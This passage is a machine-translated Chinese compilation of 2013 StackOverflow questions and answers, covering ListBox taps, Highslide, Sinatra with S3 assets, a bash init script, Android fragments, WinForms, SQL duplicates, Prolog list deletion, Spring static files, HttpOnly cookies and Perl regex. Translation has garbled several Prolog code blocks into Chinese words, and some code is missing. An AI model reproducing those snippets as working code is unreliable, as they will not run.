注意：这是我最接近的 StackOverflow 问题：[How to get the listbox item's properties after event "tap"](https://stackoverflow.com/questions/13779828/how-to-get-the-listbox-items-properties-after-event-tap)，但它仍然没有帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:10:00.330

是`Grid`里面`ItemTemplate`的`ListBox`。这意味着该`Grid.DataContext`属性将成为您的`SmartTextItemModel`类的一个实例：

```
private void SmartTextElement_Tap(object sender, System.Windows.Input.GestureEventArgs e)
{
    var grid = sender as Grid;
    if (grid == null)
        return;

   var item = grid.DataContext as SmartTextItemModel;
   if (item == null)
        return;

   item.// Navigate to url...
} 
```

# highslide - 如何在关闭展开的图像时防止拇指条跳回顶部？

> ID：15510306
> 
> 赞同：0
> 
> 时间：2013-03-19T20:58:43.317
> 
> 标签：highslide

我搜索了（现已关闭）论坛，并搜索了此处标记为 Highslide 的所有问题，但没有发现我认为是一个简单的解决方法。

Highslide 完美运行，没有问题，这更像是一个界面的东西。如果我加载一个有足够缩略图的页面，自然会生成一个滚动条。如果使用该拇指条（如果重要，它是垂直的）滚动到“屏幕外”的缩略图并单击，则展开的图像会像应有的那样弹出。

但是，与此同时，拇指条向右滚动回顶部，因此当展开的图像关闭时，您必须向下滚动拇指条回到原来的位置。

我想要发生的是，当单击缩略图时，拇指条不会滚动。（显然，如果没有太多缩略图，则不会生成滚动条，也不会出现指条跳转。）

要查看我所指内容的实时页面，请访问[http://www.crown-point.com/gallery/index.html](http://www.crown-point.com/gallery/index.html)，单击 91，然后使用拇指条滚动到屏幕外缩略图。当您单击该缩略图时，您将看到展开的图像，而且拇指条也会跳回顶部。

我希望我已经很好地解释了自己，并提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T13:51:36.307

您所看到的是带有`mode: 'float'`(thumbstrip with scrollbar) 的拇指条的正常行为。

如果您希望拇指条具有不同的行为，您应该尝试使用拇指`mode: 'vertical'`条（带有滚动箭头而不是滚动条的拇指条）。

请参阅此演示库：[http](http://www.roadrash.no/hs-support/gallery-thumbstrip-leftpanel.html)
: //www.roadrash.no/hs-support/gallery-thumbstrip-leftpanel.html（此演示库包含拇指条`position: 'leftpanel'`- 将其更改为`position: 'rightpanel'`与您的画廊相似）

# ruby - 我的资产是否由 AWS S3 提供

> ID：15510312
> 
> 赞同：2
> 
> 时间：2013-03-19T20:59:10.083
> 
> 标签：ruby, heroku, amazon-s3, sinatra, assets

也许是一个非常愚蠢的问题，请不要为此标记我，但我终于让 Heroku 使用asset_sync 在我的 S3 存储桶中编译它的静态资产。

现在我怎么知道这些资产实际上是从那里提供的，我认为没有任何魔法可以将它们从 s3 中拉出来？我必须为每个带有前缀的资产设置路径

```
https://s3-eu-west-1.amazonaws.com/pathto/asset 
```

有没有办法在 sinatra 中明确设置它，我不必手动更改每个资产吗？那太傻了。

assets_sync 文档说要在 rails 中使用它

```
config.action_controller.asset_host = "//#{ENV['FOG_DIRECTORY']}.s3.amazonaws.com" 
```

但我不确定如何在 sinatra 中设置它

编辑

```
require 'bundler/setup'
Bundler.require(:default)
require 'active_support/core_ext'
require './config/env' if File.exists?('config/env.rb')
require './config/config'
require "rubygems"
require 'sinatra'

configure :development do
AssetSync.config.action_controller.asset_host = "//#{ENV['FOG_DIRECTORY']}.s3.amazonaws.com"
end

get '/' do
 erb :index
end

get '/about' do
 erb :about
end 
```

这会在控制台中出现以下错误

```
 undefined method `action_controller' for #<AssetSync::Config:0x24d1238> (NoMethodError) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T23:38:46.360

尝试通过[Async Built-in initializer](https://github.com/rumblelabs/asset_sync#available-configuration-options)将其放入[Sinatra 的配置块](http://www.sinatrarb.com/intro#Configuration)中，例如：

```
configure :production do
  AssetSync.config.action_controller.asset_host = "//#{ENV['FOG_DIRECTORY']}.s3.amazonaws.com"
end 
```

有可能你也必须`AssetSync.sync`在某个时候打电话，我不确定。

* * *

编辑：使用配置块。

如果您使用的是模块化应用程序（如果没有，它没有任何不同，只需删除这些`class`位）

```
class App < Sinatra::Base
  configure :development do
    set :this, "and that"
    enable :something
    set :this_only, "gets run in development mode"
  end

  configure :production do
    set :this, "to something else"
    disable :something
    set :this_only, "gets run in production"
    # put your AssetSync stuff in here
  end

  get "/" do
    # …
  end

  get "/assets" do
    # …
  end

  post "/more-routes" do
    # …
  end

  # etc
end 
```

有关更多信息，请参阅我在上面添加的链接。

* * *

`action_controller`是 Rails 的一部分。要为路径添加前缀，您可以做的最好的事情是使用帮助器：

```
helpers do
  def aws_asset( path )
    File.join settings.asset_host, path
  end
end

configure :production do
  set :asset_host, "//#{ENV['FOG_DIRECTORY']}.s3.amazonaws.com"
end

configure :development do
  set :asset_host, "/" # this should serve it from the `public_folder`, add subdirs if you need to.
end 
```

然后在路线或视图中，您可以执行以下操作：

```
aws_asset "sprite_number_1.jpg" 
```

要与 ERB 和[sinatra-static-assets 的 image_tag](http://rubydoc.info/gems/sinatra-static-assets/1.0.4/Sinatra/StaticAssets/Helpers#image_tag-instance_method)一起使用：

```
image_tag( aws_asset "sprite_number_1.jpg" ) 
```

或将它们组合起来（这可能不起作用，因为在`image_tag`帮助器的范围内可能看不到帮助器，尝试它比考虑它更容易）：

```
helpers do
  def aws_image( path )
    image_tag( File.join settings.asset_host, path )
  end
end

# in your view
aws_image( "sprite_number_1.jpg" ) 
```

我相信会有一种更简单的方法来做到这一点，但这会是一个快速而肮脏的解决方案。

# bash - fi 行上的 init 脚本出错

> ID：15510315
> 
> 赞同：1
> 
> 时间：2013-03-19T20:59:16.690
> 
> 标签：bash, if-statement, debian

我使用 init scipt 为 nagios 启动我的 ndo2db 并得到一个错误。

这是创建问题的脚本部分。

```
# Checking for help input
if [[ "${INPUT}" ~= ".*help$" ]]; then
HELP;
fi 
```

这是错误消息：

```
/etc/init.d/ndodaemon: 63: [[: not found 
```

完整的脚本可以在这里找到： [ndodaemonscript](https://dl.dropbox.com/u/70024219/ndodaemon.txt)

我不知道现在该怎么办。:-(

我已经尝试了几件事。（我是脚本菜鸟）

*   只有一对 []
*   将“”替换为空和“”
*   检查我的 bash 在哪里 --> /bin/sh
*   删除所有 []

我的系统：

*   最新的 Debian 6.0.7
*   Linux 2.6.32-5-amd64 #1 SMP Mon Feb 25 00:26:11 UTC 2013 x86_64

问候 ：-）

PS：对不起我的英语不好，我是德国人。;)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-19T21:10:06.123

`[[`是一种bashism。将shebang线更改为

```
#!/bin/bash 
```

在某些 Linux 发行版中，`/bin/sh`调用 bash 并且一切正常。在其他一些环境中，比如 Ubuntu，`/bin/sh`调用`/bin/dash`不实现`[[`.

# ajax - jsf：使用ajax更改整个div

> ID：15510317
> 
> 赞同：0
> 
> 时间：2013-03-19T20:59:20.187
> 
> 标签：ajax, jsf

目前，我的网页结构如下：

```
<div id="container">
<div id="navigator"></div>
<div id="content"></div>
</div> 
```

从字面上看，id 为“navigator”的 div 用于导航。我可以选择诸如“home”、“login”、“register”等。我想使用 ajax 来刷新 id 为“content”的整个 div。

所以我该怎么做？

1）显然，我需要有这些单独的 div。但以什么形式？我应该使用 ui:composition 还是其他？

2）ajax部分应该是什么？能给我举个例子？

# java - 将基于 android 活动的应用程序转换为基于片段时导致的错误

> ID：15510318
> 
> 赞同：1
> 
> 时间：2013-03-19T20:59:27.640
> 
> 标签：java, android, android-intent

我是 Android 开发的新手，我有一个简单的列表应用程序，我被要求创建它。我没有问题将应用程序作为基于活动的应用程序，但是我必须扩展功能并使用片段来实现“通用”应用程序。我的主要活动是：

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:18:47.093

通过执行以下步骤，我能够成功编译您的代码：

看起来这一行是问题所在（在 Main.java 中）：

```
contactCursor = contactDBAdapter.getAllContactsCursor(); 
```

我查看了您`contactDBAdapter`的初始化方式，结果发现您在进行`setContentView`活动后对其进行了初始化。但是，您的视图涉及对`contactDBAdapter`. 所以在 Main.java 中你需要将以下两行移动到 onCreate 窗口的顶部：

```
public void onCreate(Bundle savedInstanceState)
{
    contactDBAdapter = new ContactDBAdapter(this);
    contactDBAdapter.open();

    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    ....
} 
```

此外，Main.java 中的以下行需要删除（或注释掉）：

```
contact.clear(); 
```

此外，我必须对您调用 ListView 的方式进行两项进一步的更改

1.  在 list_view.xml 中，您识别 Android 的 ListView 的方式是：

    android:id="@+id/android:list"

2.  在 ContactListFragment.java 中，然后以这种方式调用 ListView：

    parent.myListView = (ListView)v.findViewById(android.R.id.list);

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T02:30:46.360

您的 Fragment 类需要一个空的默认构造函数。请参阅[Android 参考](http://developer.android.com/reference/android/support/v4/app/Fragment.html#pubctors)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-19T21:19:51.470

您是否尝试过使用 Eclipse 模板，它为您设置了所有内容，只需复制现有代码？

File>New>Android Application Project 然后在 Create Activity Step 下选择![看这里：](../Images/ae55cf51f7ba078d40b12eab3caccaca.png)

# c# - 最小化 WinForms 应用程序在第二次启动时恢复正常

> ID：15510324
> 
> 赞同：0
> 
> 时间：2013-03-19T20:59:57.160
> 
> 标签：c#, winforms

首先，我想解释一下“第二次启动”：我使用该[`SingleInstanceController`方法](http://www.hanselman.com/blog/TheWeeklySourceCode31SingleInstanceWinFormsAndMicrosoftVisualBasicdll.aspx)可以调用我的应用程序的`EXE`文件，并接受参数。

这样，其他应用程序或用户可以告诉应用程序采取特定操作。

该应用程序设置为以 开头`WindowState`，`Minimized`并且只有当用户单击托盘图标时，它才会恢复为`Normal`。

但我看到的是，我第一次启动应用程序时它保持最小化。然后当我第二次调用EXE文件时，它恢复到正常的窗口状态。

我没有改变窗口状态的代码。

我怀疑这是因为其他东西正在触发恢复。

我的代码`SingleInstanceController`如下所示：

```
public class SingleInstanceController : WindowsFormsApplicationBase
{
    public SingleInstanceController()
    {
        IsSingleInstance = true;

        StartupNextInstance += this_StartupNextInstance;
    }

    void this_StartupNextInstance(object sender, StartupNextInstanceEventArgs e)
    {
        Form1 form = MainForm as Form1;
        string command = e.CommandLine[1];

        switch (command.ToLowerInvariant())
        {
            case "makecall":
                string phoneNumber = e.CommandLine[2];
                PhoneAppHelper.MakePhoneCall(phoneNumber);
                break;
            default:
                System.Windows.Forms.MessageBox.Show("Argument not supported");
                break;
        }
    }

    protected override void OnCreateMainForm()
    {
        MainForm = new Form1();
    }
} 
```

在我的表单上，我有一个列表框来显示连接的设备 (USB)，还有一个多行文本框来显示一些活动，主要用于调试/信息目的。

与表单上的控件的交互是否会导致还原？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T23:34:31.977

是的，这是 WindowsFormsApplicationBase.OnStartupNextInstance() 的默认行为。您可以通过覆盖方法而不是使用事件来简单地解决这个问题。请注意，当您有要显示的消息时，您可能仍然希望发生这种情况。所以让它看起来像这样：

```
protected override void OnStartupNextInstance(StartupNextInstanceEventArgs e) {
    //...
    switch (command.ToLowerInvariant()) {
        // etc..
        default:
            base.OnStartupNextInstance(e);   // Brings it to the front
            System.Windows.Forms.MessageBox.Show("Argument not supported");
            break;
    }
} 
```

# c# - C# 和 SQL 数据复制

> ID：15510327
> 
> 赞同：1
> 
> 时间：2013-03-19T21:00:10.310
> 
> 标签：c#, sql-server

我有从 SQL 服务器提取信息并显示有关汽车的信息的代码。

问题是数据显示但重复。SQL 数据没有重复，但列表框两次显示相同的数据。

代码如下：

```
private void Show_Click(object sender, EventArgs e)
        {
            SqlConnection conn = new SqlConnection("Data Source=XXXX");
            DataTable dt = new DataTable();
            SqlDataAdapter SDA = new SqlDataAdapter("SELECT Number_Plate,Registered_Keeper,Make,Model,Year_Of_Make,Colour,Engine_Size,Transmission,Fuel_Type FROM datatable WHERE Number_Plate like '%" + label1.Text + "%'", conn);
            SDA.Fill(dt);
            if (SDA.Fill(dt) == 0)
            {

                button5.Visible = false;
                button4.Visible = true;
                label11.Visible = true;
                Show.Visible = false;
                button3.Visible = true;
                Make.Visible = false;
                Model.Visible = false;
                Year_Of_Make.Visible = false;
                Colour.Visible = false;
                Engine_Size.Visible = false;
                Transmission.Visible = false;
                Fuel_Type.Visible = false;
                Registered_Keeper.Visible = false;
                Plate.Visible = false;
                label2.Visible = false;
                label3.Visible = false;
                label4.Visible = false;
                label5.Visible = false;
                label6.Visible = false;
                label7.Visible = false;
                label8.Visible = false;
                label9.Visible = false;
                label12.Visible = false;
            }
            else
            {
                Plate.DataSource = dt;
                Plate.DisplayMember = "Number_Plate";

                Make.DataSource = dt;
                Make.DisplayMember = "Make";

                Model.DataSource = dt;
                Model.DisplayMember = "Model";

                Year_Of_Make.DataSource = dt;
                Year_Of_Make.DisplayMember = "Year_Of_Make";

                Colour.DataSource = dt;
                Colour.DisplayMember = "Colour";

                Engine_Size.DataSource = dt;
                Engine_Size.DisplayMember = "Engine_Size";

                Transmission.DataSource = dt;
                Transmission.DisplayMember = "Transmission";

                Fuel_Type.DataSource = dt;
                Fuel_Type.DisplayMember = "Fuel_Type";

                Registered_Keeper.DataSource = dt;
                Registered_Keeper.DisplayMember = "RegIstered_Keeper";

                Show.Visible = false;
                button3.Visible = true;
            }

        } 
```

注意：当我在 SQL 中添加数据时，主键缺少大约 20 个数字，所以我的数据是 20 辆汽车，但是当我添加一个新的时，它的主键大约是 50。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:05:11.853

好吧，你做`SDA.Fill(dt)`两次。尝试删除 if 之前的行。

```
...
SqlDataAdapter SDA = ...
if (SDA.Fill(dt) == 0)
... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T21:05:43.070

你调用`SDA.Fill(dt);`了两次，一次在外面，一次在 if 语句里面，

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-19T21:10:13.147

SDA.Fill(dt) 被调用了 2 次，尝试将其更改为 dt.count < 1

# php - 将查询变量发送到 php 函数的输入

> ID：15510336
> 
> 赞同：2
> 
> 时间：2013-03-19T21:00:46.423
> 
> 标签：php, javascript, variables, input

我有这个自动完成 php 功能：

搜索.php

```
if ( !isset($_REQUEST['term']) )
    exit;

$dblink = mysql_connect('localhost', 'root', '') or die( mysql_error() );
mysql_select_db('inb');

$rs = mysql_query('select name, l_name, level from pacient 
            where name like "'. mysql_real_escape_string($_REQUEST['term']) .'%"
            or l_name like "'. mysql_real_escape_string($_REQUEST['term']) .'%"
            order by name asc limit 0,10', $dblink);

$data = array();
if ( $rs && mysql_num_rows($rs) )
{
    while( $row = mysql_fetch_array($rs, MYSQL_ASSOC) )
    {
        $nivel = $row['nivel_nivel'];
        $data[] = array(
            'label' => $row['name'].' '. $row['l_name'].' '.$row['level'],
            'value' => $row['name'].' '. $row['l_name'].' '.$row['level']
        );
    }
}
echo json_encode($data);
flush();
?> 
```

我将其称为 html 主文件：

```
jQuery(document).ready(function(){ 
            $('#nameField').autocomplete({source:'search.php', minLength:1});
        }); 
```

现在，我想获取在 php 文件中进行的查询的值，并将其放在 html 文件的输入字段中。知道我该怎么做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:09:27.300

[`response`](http://api.jqueryui.com/autocomplete/#event-response)您可以在 JS 自动完成定义中为该方法设置一个侦听器。您需要更改您的 PHP 以在该数据集中的某处包含您想要的新值。

像这样的东西：

```
$data[] = array(
        'label' => $row['name'].' '. $row['l_name'].' '.$row['level'],
        'value' => $row['name'].' '. $row['l_name'].' '.$row['level'],
        'foo' => <WHATEVER VALUE YOU WANT HERE>
    ); 
```

然后在 jQuery 中：

```
$('#nameField').autocomplete({
    source:'search.php', 
    minLength:1,
    response : function(event, data) {
        data.content[0].foo; //this will have your foo value, do whatever you want with it here
    }
}); 
```

# c# - 检索具有早期绑定类的相关实体返回 null

> ID：15510338
> 
> 赞同：1
> 
> 时间：2013-03-19T21:01:01.447
> 
> 标签：c#, dynamics-crm-2011

一些背景知识：我正在用 C# 为 CRM 2011 编写自定义工作流活动，并且我正在使用由 CrmSvcUtil.exe 生成的早期绑定类。我的插件把一个机会作为它的唯一输入，应该检查它的相关活动，然后在机会上设置一个字段来表示这个机会是否需要更多的跟进。我目前的问题是，每当我尝试检索相关活动时，结果都是`null`. 这是我的代码的相关部分：
`Opportunity currentOpportunity = (Opportunity) service.Retrieve(context.PrimaryEntityName, context.PrimaryEntityId, new ColumnSet(true));`
`currentOpportunity.Opportunity_ActivityPointers`

我的印象是，由于 Opportunity 和 Activity 之间存在一对多的关系，所以这会抓住所有相关的活动，但它似乎并没有这样做。
我还是 CRM 和 C# 的新手，所以任何关于我做错了什么的见解都值得赞赏！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T21:56:05.530

如果您使用的是早期绑定类，请首先创建数据上下文（在我的情况下是*XrmServiceContext*）。您可以检索所有 ActivityPointers 其中有关对象是您的*机会*。

```
OrganizationServiceProxy orgserv;    
using(var xrm = new XrmServiceContext(orgserv))
    {
     //Opportunity currentOpportunity = ...

     IQueryable<ActivityPointer> activityPointers = xrm.ActivityPointerSet.Where(a =>
       a.RegardingObjectId == currentOpportunity.ToEntityReference());
    } 
```

ActivityPointer 包含 ActivityId 和 ActivityTypeCode 如果您需要此集合中的某些特定活动。更多细节[在这里](http://msdn.microsoft.com/en-us/library/gg328379.aspx)。

希望能帮助到你 ：）

# google-apps-script - 如何打开 PDF 附件

> ID：15510345
> 
> 赞同：0
> 
> 时间：2013-03-19T21:01:24.227
> 
> 标签：google-apps-script, google-spreadsheet-api

这是我的问题：我已经成功编写了一个脚本来发送谷歌工作表的 PDF 附件。但是，要打印文件，我必须从邮箱中打开邮件中的附件。我想知道是否可以在发送电子邮件后直接显示 PDF，所以我可以使用 File>Print 命令进行打印。以下是创建和发送附件的脚本部分：

```
var auth = "AuthSub token=\"" + AUTH_TOKEN + "\"";
var res = UrlFetchApp.fetch(url, {headers: {Authorization: auth}});
var attachments = [{fileName:"GASgenerated.pdf", content: res.getContent(),  mimeType:"application/pdf"}];
MailApp.sendEmail(email, subject, body, {attachments:attachments}); 
```

所以我的问题是：如何在 MailApp.sendEmail 命令之后立即在此脚本中打开文件“GASgenerated.pdf”，以便直接打印文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T23:58:51.487

GAS 将让您添加浏览器端 javascript：[https](https://developers.google.com/apps-script/html_service) ://developers.google.com/apps-script/html_service （这让您可以创建一个谷歌应用脚​​本 webapp）

以 PDF 格式下载的示例 URL，您将需要更改电子表格密钥。 [https://docs.google.com/feeds/download/spreadsheets/Export?key=0AkGlO9jJLGO8dDB6Z19oSE5JZVZNdHFUa0RXM1dzaWc&exportFormat=pdf&gid=3&gridlines=0&printtitle=0&size=7&portrait=true&fitw=true](https://docs.google.com/feeds/download/spreadsheets/Export?key=0AkGlO9jJLGO8dDB6Z19oSE5JZVZNdHFUa0RXM1dzaWc&exportFormat=pdf&gid=3&gridlines=0&printtitle=0&size=7&portrait=true&fitw=true)

# prolog - 从列表中删除元素

> ID：15510350
> 
> 赞同：2
> 
> 时间：2013-03-19T21:01:36.233
> 
> 标签：prolog, prolog-dif

我知道这个问题已经被问过了，但我只想问一下我的具体实现。我编写这个函数只是为了练习 Prolog 并更好地理解 Prolog。这是我所拥有的：

```
del(Ele, [H], [H]) :- Ele \= H.
del(Ele, [H|T], [H|New]) :-
    Ele \= H,
    del(Ele, T, [New]). 
```

`New`这个想法是，如果我要删除的元素不等于，我会将一个元素添加到一个名为的新列表中`H`。据我了解，我的代码无法正常工作，因为我的代码在到达 where 元素时停止`Ele \= H`。任何想法如何解决这一问题？

例如，`del(5, [3,4,5,6,7], X)`将返回 false。

另外，有没有更好的解决方案？将列表中的每个元素继续添加到新列表似乎是一个糟糕的解决方案，因为这对于大列表来说会很慢。我宁愿只保留当前列表中的元素，找到匹配`Ele`的元素，删除该元素，然后返回列表。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:06:43.393

您已经描述**了一些**`del/3`应该成立的情况。但这些只是`Ele`与列表中的元素不相等/不可统一的情况。有几样东西不见了：

空列表呢？

什么，如果`Ele`等于元素？

因此，您需要添加更多子句。（由于冗余原因，稍后您可能还会删除一些）。

如果您使用的是 SWI、B、SICStus 或 YAP，请考虑使用`dif/2`. [序言差异](/questions/tagged/prolog-dif "show questions tagged 'prolog-dif'")`(\=)/2`

`dif/2`这就是在这种情况下如此有用的原因。有了`dif/2`你就会有一个纯粹的单调程序。你可以直接试一试：

```
?- 德尔（5，[3,4,5,6,7]，X）。
假的。

```

你有同样的问题。让我重申一下问题所在：您期望某些东西应该成立，但事实并非如此。所以这种关系定义得太狭隘了。如果我概括查询，我可能会得到更好的答案。尝试`del(E, [3,4,5,6,7], X).`但再次相同`false`。所以我会尝试一个更一般的查询：

```
?- 德尔（E，Xs，Ys）。
Xs = Ys, Ys = [_G1076],
差异（E，_G1076）...

```

对我来说看起来很完美！也许另一个答案：

```
?- 德尔（E，Xs，Ys）。
Xs = Ys, Ys = [_G1076],
差异（E，_G1076）；
Xs = [_G1133, _G1136],
Ys = [_G1133|_G1136]，
差异（E，_G1136），
差异（E，_G1133） ...

```

现在我们得到了一个错误的答案。我将对其进行一些实例化以使其更具可读性：

```
?- del(e, [a,b], Ys)。
Ys = [a|b] ;
错误的。

```

这个答案显然是不正确的，因为`[a|b]`它不是一个列表。而且，这可能是最小的错误答案......

我想通过这一点向您展示的是，您通常可以在**不**逐步进行的情况下找到问题。一旦获得更复杂的控制流（如并发），逐步调试甚至在命令式语言中都不起作用；它在 Prolog 中根本无法扩展。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T21:14:47.193

让我们追踪：

```
?- trace, del(5, [3,4,5,6,7], X).
   Call: (7) del(5, [3, 4, 5, 6, 7], _G218) ? creep
   Call: (8) 5\=3 ? creep
   Exit: (8) 5\=3 ? creep
   Call: (8) del(5, [4, 5, 6, 7], [_G344]) ? creep
   Call: (9) 5\=4 ? creep
   Exit: (9) 5\=4 ? creep
   Call: (9) del(5, [5, 6, 7], [[]]) ? creep
   Fail: (9) del(5, [5, 6, 7], [[]]) ? creep
   Fail: (8) del(5, [4, 5, 6, 7], [_G344]) ? creep
   Fail: (7) del(5, [3, 4, 5, 6, 7], _G218) ? creep
false. 
```

所以你可以看到你的代码在到达 5 时实际上是失败的，因为它`5 \= 5`是错误的。您的第一条规则永远不会匹配，因为列表中有多个项目。第二条规则在找到后“正确”重复出现`5 \= 3`，`5 \= 4`但由于您的任何规则都没有`5 = 5`案例，因此失败发生在那里。

顺便说一下，让我们看看当列表中没有出现 5 时会发生什么：

```
?- trace, del(5, [3,4,6,7], X).
   Call: (7) del(5, [3, 4, 6, 7], _G350) ? creep
   Call: (8) 5\=3 ? creep
   Exit: (8) 5\=3 ? creep
   Call: (8) del(5, [4, 6, 7], [_G473]) ? creep
   Call: (9) 5\=4 ? creep
   Exit: (9) 5\=4 ? creep
   Call: (9) del(5, [6, 7], [[]]) ? creep
   Fail: (9) del(5, [6, 7], [[]]) ? creep
   Fail: (8) del(5, [4, 6, 7], [_G473]) ? creep
   Fail: (7) del(5, [3, 4, 6, 7], _G350) ? creep
false. 
```

这就是为什么我之前说“正确”的原因：您的归纳案例也不正确。一方面，你有，`del(Ele, T, [New])`但在上面你有`del(Ele, [H|T], [H|New])`，所以你要在右边多花时间展开列表（这就是我们的跟踪`[[]]`在其中的原因）。但是@false 遇到了更大的问题，即您根本不会考虑实际找到要删除的内容的情况。:) 您也不处理列表为空的情况。

不幸的是，遍历数据结构并查看每个项目将是 O(N)。另一个不幸的事实是，在函数式和声明式语言（缺少[“可赋值”](http://existentialtype.wordpress.com/2012/02/01/words-matter/)的语言）中，修改列表意味着复制列表的至少一部分。在 Prolog 中有更有效的方法来解决这个问题（例如，您可以使用差异列表）但它们将共享相同的基本问题。Prolog 效率是一个相当大的话题。我会告诉你不要太担心它，但它有办法很快成为你的关注点。但在这种情况下，不，没有真正更有效的方法使用破坏性更新。

# java - Spring Web 应用程序将 Javascript 和 CSS 添加到 HTML 文件

> ID：15510353
> 
> 赞同：0
> 
> 时间：2013-03-19T21:01:51.840
> 
> 标签：java, spring, maven, jboss, war

我在将 javascript 和 css 文件添加到我的 maven、spring webapp 项目时遇到了一些问题。

我正在搜索网络和此处，但在将所有内容放在正确的位置时遇到问题。

我想要做的是在根上下文中有一个 index.html 页面，并从中引用系统中的本地 javascript 文件

.war 布局

```
war/
  index.html
  js/
    javascript.js
  css/
    default.css
  WEB-INF/
    classes/
      *.classes
    lib/
      *.jar
    springapp-servlet.xml
    web.xml 
```

index.html 文件

```
<html>
<head>
<link href="css/jquery.mobile-1.3.0.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="js/jquery.mobile-1.3.0.js"></script>
</head>
<body>
  <div data-role="header">
    <h1>Page Title</h1>
  </div>
</body>
</html> 
```

web.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
    xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
    id="WebApp_ID" version="2.5">
    <display-name>springTest</display-name>

    <servlet>
        <servlet-name>springapp</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <load-on-startup>1</load-on-startup>
    </servlet>

    <servlet-mapping>
        <servlet-name>springapp</servlet-name>
        <url-pattern>*.do</url-pattern>
    </servlet-mapping>
</web-app> 
```

springapp-servlet.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context"
    xmlns:mvc="http://www.springframework.org/schema/mvc"
    xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.5.xsd
     http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd
     http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-3.0.xsd">

    <!-- View resolvers -->

    <bean id="viewResolver"
        class="org.springframework.web.servlet.view.velocity.VelocityViewResolver">
        <property name="cache" value="false" />
        <property name="prefix" value="" />
        <property name="suffix" value=".vm" />
    </bean>

    <bean id="velocityConfig"
        class="org.springframework.web.servlet.view.velocity.VelocityConfigurer">
    </bean>

<!-- controllers and java service beans -->
.....

<mvc:resources mapping="/**" location="/" />

</beans> 
```

现在我认为这将使 js 和 css 目录可用于在 html 文件中进行链接，但我只得到纯文本并且没有查询移动视图。

使用 Spring 和 Maven 在 Jboss AS 7 中运行它。

最好的问候亨利克

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T17:51:35.873

嗯，不知何故，用我的结构让它工作了......

# java - 如何为 java web 应用程序设置 httponly 和 session cookie

> ID：15510354
> 
> 赞同：14
> 
> 时间：2013-03-19T21:01:51.760
> 
> 标签：java, security, xss, httponly

我正在处理 XSS（跨站点脚本）问题。我的应用程序在 Oracle Weblogic 门户上运行。我们使用 Servlet 2.5 版。

我在过滤器中添加了以下 3 行代码，用于设置 httponly 和安全 cookie，它工作正常。

```
String sessionid = req.getSession().getId();
res.setHeader("Set-Cookie", "JSESSIONID=" +  sessionid + ";HttpOnly");
res.setHeader("SET-COOKIE", "JSESSIONID=" + sessionid + "; secure"); 
```

问题是当我注销并立即在同一个浏览器中登录时。我可以登录，但在那之后，在 jsp 页面上我遇到了会话超时问题。我们使用weblogic相关的api。api返回null ..`request.getuserprinical()`猜测它设置为null。

请分享任何想法。

如果有任何其他方法可以设置 httponly 或安全标志，请帮助。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-07-16T23:19:38.820

根据您的 Web 容器的具体情况，在应用程序中修改容器管理的会话 cookie 可能会导致应用程序服务器丢弃现有会话并创建一个新会话。我在 Tomcat 上观察到了这一点，但对于 Weblogic 来说可能类似。

如果您使用的是 Servlets 3.0，您实际上可以通过以下片段指示应用服务器确保所有会话 cookie 都是 HttpOnly 和安全的：

```
<session-config>
  <cookie-config>
    <secure>true</secure>
    <http-only>true</http-only>
  </cookie-config>
</session-config> 
```

这是一种比使用过滤器手动破解 cookie 更好的方法。

仅供参考：我还编写了一个[Java 库](https://github.com/stevespringett/headlines)，它在基于 Servlet 的应用程序中注入了许多与安全相关的响应标头。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-22T13:41:23.820

您需要使用以下语法来设置 httponly 和 Secure 标志

```
JSESSIONID=ABC3423DF...SDF;HttpOnly;Secure 
```

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2017-11-16T05:23:28.573

我在 web.xml 中使用 `<http-only>`和`<secure>`标签来设置安全属性并且它有效。

```
<session-config>
 <cookie-config>
  <http-only>true</http-only>
 </cookie-config>
<session-config> 
```

# regex - Perl：通过正则表达式匹配更改字符串

> ID：15510356
> 
> 赞同：0
> 
> 时间：2013-03-19T21:01:58.560
> 
> 标签：regex, perl

我正在使用此代码通过正则表达式匹配来更改字符串。

```
$a->{'someone'} = "a _{person}";
$a->{'person'} = "gremlin";

$string = "_{someone} and a thing"
while($string =~ /(_\{(.*?)\}/g){
    $search = metaquote($1);
    $replace = $a->{$2};
    $string =~ s/$search/$replace/;
} 
```

结果是`a _{person} and a thing`，但我期待：`a gremlin and a thing`.

怎么做才能让它工作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-19T21:07:22.413

